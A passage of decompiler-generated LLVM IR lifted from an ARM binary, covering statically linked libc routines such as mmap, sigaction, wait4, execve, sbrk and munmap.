  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14eb4 = add i32 %v0_14ea4, 26296
  %v4_14eb4 = inttoptr i32 %v3_14eb4 to i32*
  store i32 %arg5, i32* %v4_14eb4, align 4
  %v0_14ecc17 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ecc18 = load i32, i32* %r5.global-to-local, align 4
  %v3_14ecc20 = icmp ult i32 %v0_14ecc17, %v1_14ecc18
  %v9_14ecc26 = icmp eq i32 %v0_14ecc17, %v1_14ecc18
  store i1 %v9_14ecc26, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14ecc20, label %dec_label_pc_14ebc, label %dec_label_pc_14efc.lr.ph

dec_label_pc_14ebc:                               ; preds = %dec_label_pc_14ebc, %bb65
  %v1_14ebc = phi i32 [ %v1_14ec8, %dec_label_pc_14ebc ], [ %v0_14ecc17, %bb65 ]
  %v0_14ebc = load i32, i32* %r8.global-to-local, align 4
  %v4_14ebc = mul i32 %v1_14ebc, 4
  %v5_14ebc = add i32 %v4_14ebc, %v0_14ebc
  %v6_14ebc = inttoptr i32 %v5_14ebc to i32*
  %v7_14ebc = load i32, i32* %v6_14ebc, align 4
  store i32 %v7_14ebc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14ebc)
  %v0_14ec8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ec8 = add i32 %v0_14ec8, 1
  store i32 %v1_14ec8, i32* %r4.global-to-local, align 4
  %v1_14ecc = load i32, i32* %r5.global-to-local, align 4
  %v3_14ecc = icmp ult i32 %v1_14ec8, %v1_14ecc
  %v9_14ecc = icmp eq i32 %v1_14ec8, %v1_14ecc
  store i1 %v9_14ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14ecc, label %dec_label_pc_14ebc, label %dec_label_pc_14efc.lr.ph

dec_label_pc_14efc.lr.ph:                         ; preds = %dec_label_pc_14ebc, %bb65
  %v2_14ed4 = icmp eq i32 %v0_14d30, 0
  store i1 %v2_14ed4, i1* %cpsr_z.global-to-local, align 1
  %v2_14edc = xor i1 %v2_14ed4, true
  call void @__pseudo_cond_branch(i1 %v2_14edc, i32 %v0_14d30)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_14ef0 = load i32, i32* @r6, align 4
  %v2_14ef0 = add i32 %v0_14ef0, -12
  store i32 %v2_14ef0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14efc

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14efc.dec_label_pc_14efc_crit_edge, %dec_label_pc_14efc.lr.ph
  %v1_14efc = phi i32 [ %v1_14f08, %dec_label_pc_14efc.dec_label_pc_14efc_crit_edge ], [ 0, %dec_label_pc_14efc.lr.ph ]
  %v0_14efc = phi i32 [ %v0_14efc.pre, %dec_label_pc_14efc.dec_label_pc_14efc_crit_edge ], [ %v2_14ef0, %dec_label_pc_14efc.lr.ph ]
  %v4_14efc = mul i32 %v1_14efc, 4
  %v5_14efc = add i32 %v4_14efc, %v0_14efc
  %v6_14efc = inttoptr i32 %v5_14efc to i32*
  %v7_14efc = load i32, i32* %v6_14efc, align 4
  store i32 %v7_14efc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14efc)
  %v0_14f08 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f08 = add i32 %v0_14f08, 1
  store i32 %v1_14f08, i32* %r4.global-to-local, align 4
  %v1_14f0c = load i32, i32* %r5.global-to-local, align 4
  %v3_14f0c = icmp ult i32 %v1_14f08, %v1_14f0c
  %v9_14f0c = icmp eq i32 %v1_14f08, %v1_14f0c
  store i1 %v9_14f0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14f0c, label %dec_label_pc_14efc.dec_label_pc_14efc_crit_edge, label %dec_label_pc_14f14

dec_label_pc_14efc.dec_label_pc_14efc_crit_edge:  ; preds = %dec_label_pc_14efc
  %v0_14efc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14efc

dec_label_pc_14f14:                               ; preds = %dec_label_pc_14efc
  %v0_14f18.pre = load i32, i32* @r6, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_14f18 = add i32 %v0_14f18.pre, 108
  %v3_14f18 = inttoptr i32 %v2_14f18 to i32*
  %v4_14f18 = load i32, i32* %v3_14f18, align 4
  store i32 %v4_14f18, i32* %r2.global-to-local, align 4
  store i32 %v4_14f18, i32* %r3.global-to-local, align 4
  %v2_14f20 = icmp eq i32 %v4_14f18, 0
  store i1 %v2_14f20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14f20, label %dec_label_pc_14f38, label %dec_label_pc_14f28

dec_label_pc_14f28:                               ; preds = %dec_label_pc_14f14
  call void @__pseudo_branch(i32 %v4_14f18)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14f34 = load i32, i32* @r0, align 4
  %v2_14f34 = inttoptr i32 %v1_14f34 to i32*
  store i32 0, i32* %v2_14f34, align 4
  %v0_14f3c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14f38

dec_label_pc_14f38:                               ; preds = %dec_label_pc_14f14, %dec_label_pc_14f28
  %v0_14f3c = phi i32 [ %v0_14f18.pre, %dec_label_pc_14f14 ], [ %v0_14f3c.pre, %dec_label_pc_14f28 ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_14f3c = add i32 %v0_14f3c, 84
  %v3_14f3c = inttoptr i32 %v2_14f3c to i32*
  %v4_14f3c = load i32, i32* %v3_14f3c, align 4
  store i32 %v4_14f3c, i32* %r2.global-to-local, align 4
  store i32 %v4_14f3c, i32* %r3.global-to-local, align 4
  %v2_14f44 = icmp eq i32 %v4_14f3c, 0
  store i1 %v2_14f44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14f44, label %dec_label_pc_14f5c, label %dec_label_pc_14f4c

dec_label_pc_14f4c:                               ; preds = %dec_label_pc_14f38
  call void @__pseudo_branch(i32 %v4_14f3c)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14f58 = load i32, i32* @r0, align 4
  %v2_14f58 = inttoptr i32 %v1_14f58 to i32*
  store i32 0, i32* %v2_14f58, align 4
  %v0_14f60.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14f5c

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f38, %dec_label_pc_14f4c
  %v0_14f60 = phi i32 [ %v0_14f3c, %dec_label_pc_14f38 ], [ %v0_14f60.pre, %dec_label_pc_14f4c ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_14f60 = add i32 %v0_14f60, 28
  %v3_14f60 = inttoptr i32 %v2_14f60 to i32*
  %v4_14f60 = load i32, i32* %v3_14f60, align 4
  store i32 %v4_14f60, i32* %r3.global-to-local, align 4
  %v1_14f68 = inttoptr i32 %v4_14f60 to i32*
  %v2_14f68 = load i32, i32* %v1_14f68, align 4
  store i32 %v2_14f68, i32* %r2.global-to-local, align 4
  %v0_14f6c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_14f6c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_14f78 = call i32 @__GI_exit(i32 %v0_14f6c)
  store i32 %v1_14f78, i32* %r0.global-to-local, align 4
  %v0_14f7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14f7c, label %bb66, label %.thread8

bb66:                                             ; preds = %dec_label_pc_14f5c
  %v2_14f7c = load i32, i32* %ip.global-to-local, align 4
  %v2_14f80 = load i32, i32* %r4.global-to-local, align 4
  %v8_14f80 = shl i32 %v2_14f80, %v1_14f78
  %v9_14f80 = and i32 %v8_14f80, %v1_14f78
  %v8_14f84 = shl i32 %v2_14f7c, %v9_14f80
  %v9_14f84 = and i32 %v8_14f84, %v9_14f80
  store i32 %v9_14f84, i32* %r0.global-to-local, align 4
  %v1_14f88 = load i32, i32* @r6, align 4
  %v2_14f88 = trunc i32 %v1_14f88 to i16
  %v4_14f88 = inttoptr i32 %v9_14f84 to i16*
  store i16 %v2_14f88, i16* %v4_14f88, align 2
  %v5_14f88 = load i32, i32* %ip.global-to-local, align 4
  %v6_14f88 = load i32, i32* %r0.global-to-local, align 4
  %v7_14f88 = sub i32 %v6_14f88, %v5_14f88
  %v2_14f90 = load i32, i32* %r2.global-to-local, align 4
  %v3_14f90 = and i32 %v2_14f90, %v7_14f88
  store i32 %v3_14f90, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14f5c, %bb66
  %v4_14f9c = phi i32 [ %v1_14f78, %dec_label_pc_14f5c ], [ 0, %bb66 ]
  ret i32 %v4_14f9c

; uselistorder directives
  uselistorder i32 %v1_14f78, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14f18.pre, { 1, 0 }
  uselistorder i32 %v1_14f0c, { 1, 0 }
  uselistorder i32 %v1_14f08, { 3, 2, 1, 0 }
  uselistorder i32 %v1_14ecc, { 1, 0 }
  uselistorder i32 %v1_14ec8, { 1, 2, 3, 0 }
  uselistorder i32 %v4_14e80, { 1, 0, 2 }
  uselistorder i1 %v8_14dc8, { 1, 2, 0 }
  uselistorder i32 %v2_14d98, { 1, 2, 0 }
  uselistorder i1 %v2_14d80, { 1, 0 }
  uselistorder i32 %v5_14d84, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14d64, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v2_14d10, { 1, 0, 2, 3 }
  uselistorder i32 %v3_14d00, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 1, 0, 2, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 5, 7, 6, 0, 1, 3, 2, 4, 9, 8, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 18, 11, 12, 13, 14, 15, 16, 17, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 10, 6, 7, 8, 9, 11, 12, 1, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 9, 0, 10, 6, 1, 7, 8, 11, 12, 13, 14, 15, 16, 17, 19, 18, 2, 20 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 3, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_14f5c, { 1, 0 }
  uselistorder label %dec_label_pc_14f38, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14e48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14e24, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_14d98, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_14d80, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14fbc = load i32, i32* @r4, align 4
  store i32 %v3_14fbc, i32* %stack_var_-16, align 4
  %v3_14fc8 = urem i32 %arg3, 4096
  %v2_14fcc = icmp eq i32 %v3_14fc8, 0
  br i1 %v2_14fcc, label %dec_label_pc_14fe8, label %dec_label_pc_14fd4

dec_label_pc_14fd4:                               ; preds = %entry
  %v0_14fd4 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14fe0 = inttoptr i32 %v0_14fd4 to i32*
  store i32 22, i32* %v2_14fe0, align 4
  %v0_15018.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15018

dec_label_pc_14fe8:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15014, label %dec_label_pc_15004

dec_label_pc_15004:                               ; preds = %dec_label_pc_14fe8
  %v0_15004 = call i32 @__GI___errno_location()
  %v0_15008 = load i32, i32* %r4.global-to-local, align 4
  %v1_15008 = sub i32 0, %v0_15008
  %v2_1500c = inttoptr i32 %v0_15004 to i32*
  store i32 %v1_15008, i32* %v2_1500c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15014

dec_label_pc_15014:                               ; preds = %dec_label_pc_14fe8, %dec_label_pc_15004
  %v0_15014 = phi i32 [ %arg1, %dec_label_pc_14fe8 ], [ -1, %dec_label_pc_15004 ]
  store i32 %v0_15014, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15018

dec_label_pc_15018:                               ; preds = %dec_label_pc_14fd4, %dec_label_pc_15014
  %v0_15018 = phi i32 [ %v0_15018.pre, %dec_label_pc_14fd4 ], [ %v0_15014, %dec_label_pc_15014 ]
  %v2_1501c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1501c, i32* @r4, align 4
  ret i32 %v0_15018

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15018, { 1, 0 }
  uselistorder label %dec_label_pc_15014, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_15024 = load i32, i32* @r4, align 4
  store i32 %v3_15024, i32* %stack_var_-8, align 4
  %v0_15028 = load i32, i32* @r0, align 4
  %v0_1502c = call i32 @__GI___errno_location()
  %v1_15030 = sub i32 0, %v0_15028
  %v2_15034 = inttoptr i32 %v0_1502c to i32*
  store i32 %v1_15030, i32* %v2_15034, align 4
  %v2_1503c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1503c, i32* @r4, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15044 = load i32, i32* @r4, align 4
  %v6_15044 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1504c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1504c, label %dec_label_pc_150a0, label %dec_label_pc_15064

dec_label_pc_15064:                               ; preds = %entry
  %v1_15064 = add i32 %arg2, 4
  %v2_15064 = inttoptr i32 %v1_15064 to i32*
  %v3_15064 = load i32, i32* %v2_15064, align 4
  store i32 %v3_15064, i32* @r3, align 4
  %v1_15068 = and i32 %v3_15064, 67108864
  %v2_15068 = icmp eq i32 %v1_15068, 0
  br i1 %v2_15068, label %dec_label_pc_15070, label %dec_label_pc_150a0

dec_label_pc_15070:                               ; preds = %dec_label_pc_15064
  store i32 20, i32* @r2, align 4
  %v2_15074 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15074, i32* @r0, align 4
  %v0_15078 = call i32 @memcpy()
  %v0_150a0.pre = load i32, i32* @r5, align 4
  %v0_150a8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150a0

dec_label_pc_150a0:                               ; preds = %dec_label_pc_15064, %entry, %dec_label_pc_15070
  %v0_150a8 = phi i32 [ %arg3, %dec_label_pc_15064 ], [ %arg3, %entry ], [ %v0_150a8.pre, %dec_label_pc_15070 ]
  %v0_150a4 = phi i32 [ %arg2, %dec_label_pc_15064 ], [ 0, %entry ], [ %v2_15074, %dec_label_pc_15070 ]
  %v0_150a0 = phi i32 [ %arg1, %dec_label_pc_15064 ], [ %arg1, %entry ], [ %v0_150a0.pre, %dec_label_pc_15070 ]
  %v4_150b0 = call i32 @__syscall_rt_sigaction(i32 %v0_150a0, i32 %v0_150a4, i32 %v0_150a8, i32 8)
  store i32 %v3_15044, i32* @r4, align 4
  store i32 %v6_15044, i32* @r5, align 4
  ret i32 %v4_150b0

; uselistorder directives
  uselistorder label %dec_label_pc_150a0, { 2, 0, 1 }
}

define i32 @function_150c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_150c4:
  %v0_150c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_150c4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_150c4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_150c4, %bb
  %v0_150cc = phi i32 [ %arg1, %dec_label_pc_150c4 ], [ 0, %bb ]
  ret i32 %v0_150cc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_150e0 = load i32, i32* @r0, align 4
  ret i32 %v0_150e0
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_150e4 = load i32, i32* @r7, align 4
  store i32 %v3_150e4, i32* %stack_var_-8, align 4
  %v0_150f0 = load i32, i32* @r0, align 4
  store i32 %v0_150f0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_150f0, -4095
  br i1 %tmp, label %dec_label_pc_1510c, label %dec_label_pc_150fc

dec_label_pc_150fc:                               ; preds = %entry
  %v0_150fc = call i32 @__GI___errno_location()
  %v0_15100 = load i32, i32* %r7.global-to-local, align 4
  %v1_15100 = sub i32 0, %v0_15100
  %v2_15104 = inttoptr i32 %v0_150fc to i32*
  store i32 %v1_15100, i32* %v2_15104, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15110.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1510c

dec_label_pc_1510c:                               ; preds = %entry, %dec_label_pc_150fc
  %v2_15110 = phi i32 [ %v3_150e4, %entry ], [ %v2_15110.pre, %dec_label_pc_150fc ]
  %v0_1510c = phi i32 [ %v0_150f0, %entry ], [ -1, %dec_label_pc_150fc ]
  store i32 %v2_15110, i32* @r7, align 4
  ret i32 %v0_1510c

; uselistorder directives
  uselistorder i32 %v0_150f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1510c, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15118 = load i32, i32* @r7, align 4
  store i32 %v3_15118, i32* %stack_var_-8, align 4
  %v0_15124 = load i32, i32* @r0, align 4
  store i32 %v0_15124, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15124, -4095
  br i1 %tmp, label %dec_label_pc_15144, label %dec_label_pc_15134

dec_label_pc_15134:                               ; preds = %entry
  %v0_15134 = call i32 @__GI___errno_location()
  %v0_15138 = load i32, i32* %r7.global-to-local, align 4
  %v1_15138 = sub i32 0, %v0_15138
  %v2_1513c = inttoptr i32 %v0_15134 to i32*
  store i32 %v1_15138, i32* %v2_1513c, align 4
  %v2_15144.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15144

dec_label_pc_15144:                               ; preds = %entry, %dec_label_pc_15134
  %v1_15148 = phi i32 [ %v0_15124, %entry ], [ -1, %dec_label_pc_15134 ]
  %v2_15144 = phi i32 [ %v3_15118, %entry ], [ %v2_15144.pre, %dec_label_pc_15134 ]
  store i32 %v2_15144, i32* %r7.global-to-local, align 4
  ret i32 %v1_15148

; uselistorder directives
  uselistorder i32 %v0_15124, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15144, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_1515c = load i32, i32* @r0, align 4
  ret i32 %v1_1515c
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15160 = load i32, i32* @r7, align 4
  store i32 %v3_15160, i32* %stack_var_-8, align 4
  %v0_1516c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1516c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1516c, -4095
  br i1 %tmp, label %dec_label_pc_1518c, label %dec_label_pc_1517c

dec_label_pc_1517c:                               ; preds = %entry
  %v0_1517c = call i32 @__GI___errno_location()
  %v0_15180 = load i32, i32* %r7.global-to-local, align 4
  %v1_15180 = sub i32 0, %v0_15180
  %v2_15184 = inttoptr i32 %v0_1517c to i32*
  store i32 %v1_15180, i32* %v2_15184, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1518c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1518c

dec_label_pc_1518c:                               ; preds = %entry, %dec_label_pc_1517c
  %v1_15190 = phi i32 [ %v0_1516c, %entry ], [ -1, %dec_label_pc_1517c ]
  %v2_1518c = phi i32 [ %v3_15160, %entry ], [ %v2_1518c.pre, %dec_label_pc_1517c ]
  store i32 %v2_1518c, i32* %r7.global-to-local, align 4
  ret i32 %v1_15190

; uselistorder directives
  uselistorder i32 %v0_1516c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1518c, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15194 = load i32, i32* @r7, align 4
  store i32 %v3_15194, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_151bc, label %dec_label_pc_151ac

dec_label_pc_151ac:                               ; preds = %entry
  %v0_151ac = call i32 @__GI___errno_location()
  %v0_151b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_151b0 = sub i32 0, %v0_151b0
  %v2_151b4 = inttoptr i32 %v0_151ac to i32*
  store i32 %v1_151b0, i32* %v2_151b4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_151c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_151bc

dec_label_pc_151bc:                               ; preds = %entry, %dec_label_pc_151ac
  %v2_151c0 = phi i32 [ %v3_15194, %entry ], [ %v2_151c0.pre, %dec_label_pc_151ac ]
  %v0_151bc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_151ac ]
  store i32 %v2_151c0, i32* @r7, align 4
  ret i32 %v0_151bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_151bc, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_151d8 = load i32, i32* @r0, align 4
  ret i32 %v1_151d8
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_151ec = load i32, i32* @r0, align 4
  ret i32 %v1_151ec
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_151f0 = load i32, i32* @r4, align 4
  store i32 %v3_151f0, i32* %stack_var_-16, align 4
  store i32 26312, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r4.global-to-local, align 4
  %v4_15200 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 26312) to i32*), align 4
  %v2_15204 = icmp eq i32 %v4_15200, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_15204, label %dec_label_pc_15210, label %dec_label_pc_15220

dec_label_pc_15210:                               ; preds = %entry
  %v1_15214 = call i32 @__GI_brk(i32 0)
  %v1_15218 = icmp slt i32 %v1_15214, 0
  br i1 %v1_15218, label %dec_label_pc_15244, label %dec_label_pc_15220thread-pre-split

dec_label_pc_15220thread-pre-split:               ; preds = %dec_label_pc_15210
  %v0_15224.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_15220.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15220.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15220

dec_label_pc_15220:                               ; preds = %dec_label_pc_15220thread-pre-split, %entry
  %v1_15220 = phi i32 [ %v1_15220.pre, %dec_label_pc_15220thread-pre-split ], [ 26312, %entry ]
  %v0_15220 = phi i32 [ %v0_15220.pre, %dec_label_pc_15220thread-pre-split ], [ ptrtoint (i16* @global_var_26010.295 to i32), %entry ]
  %v1_15234 = phi i32 [ %v0_15224.pr, %dec_label_pc_15220thread-pre-split ], [ %arg1, %entry ]
  %v2_15220 = add i32 %v0_15220, %v1_15220
  %v3_15220 = inttoptr i32 %v2_15220 to i32*
  %v4_15220 = load i32, i32* %v3_15220, align 4
  %v2_15224 = icmp eq i32 %v1_15234, 0
  store i32 %v4_15220, i32* %r4.global-to-local, align 4
  br i1 %v2_15224, label %dec_label_pc_15248, label %dec_label_pc_15230

dec_label_pc_15230:                               ; preds = %dec_label_pc_15220
  %v2_15234 = add i32 %v4_15220, %v1_15234
  %v1_15238 = call i32 @__GI_brk(i32 %v2_15234)
  %v1_1523c = icmp slt i32 %v1_15238, 0
  br i1 %v1_1523c, label %dec_label_pc_15244, label %dec_label_pc_15230.dec_label_pc_15248_crit_edge

dec_label_pc_15230.dec_label_pc_15248_crit_edge:  ; preds = %dec_label_pc_15230
  %v0_15248.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15248

dec_label_pc_15244:                               ; preds = %dec_label_pc_15230, %dec_label_pc_15210
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15248

dec_label_pc_15248:                               ; preds = %dec_label_pc_15220, %dec_label_pc_15230.dec_label_pc_15248_crit_edge, %dec_label_pc_15244
  %v0_15248 = phi i32 [ %v0_15248.pre, %dec_label_pc_15230.dec_label_pc_15248_crit_edge ], [ -1, %dec_label_pc_15244 ], [ %v4_15220, %dec_label_pc_15220 ]
  %v2_1524c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1524c, i32* @r4, align 4
  %sext = mul i32 %v0_15248, 65536
  %v2_15250 = sdiv i32 %sext, 65536
  ret i32 %v2_15250

; uselistorder directives
  uselistorder i32 %v4_15220, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_15248, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1526c = load i32, i32* @r0, align 4
  ret i32 %v1_1526c
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15270 = load i32, i32* @r7, align 4
  store i32 %v3_15270, i32* %stack_var_-8, align 4
  %v0_1527c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1527c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1527c, -4095
  br i1 %tmp, label %dec_label_pc_1529c, label %dec_label_pc_1528c

dec_label_pc_1528c:                               ; preds = %entry
  %v0_1528c = call i32 @__GI___errno_location()
  %v0_15290 = load i32, i32* %r7.global-to-local, align 4
  %v1_15290 = sub i32 0, %v0_15290
  %v2_15294 = inttoptr i32 %v0_1528c to i32*
  store i32 %v1_15290, i32* %v2_15294, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1529c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1529c

dec_label_pc_1529c:                               ; preds = %entry, %dec_label_pc_1528c
  %v1_152a0 = phi i32 [ %v0_1527c, %entry ], [ -1, %dec_label_pc_1528c ]
  %v2_1529c = phi i32 [ %v3_15270, %entry ], [ %v2_1529c.pre, %dec_label_pc_1528c ]
  store i32 %v2_1529c, i32* @r7, align 4
  ret i32 %v1_152a0

; uselistorder directives
  uselistorder i32 %v0_1527c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1529c, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
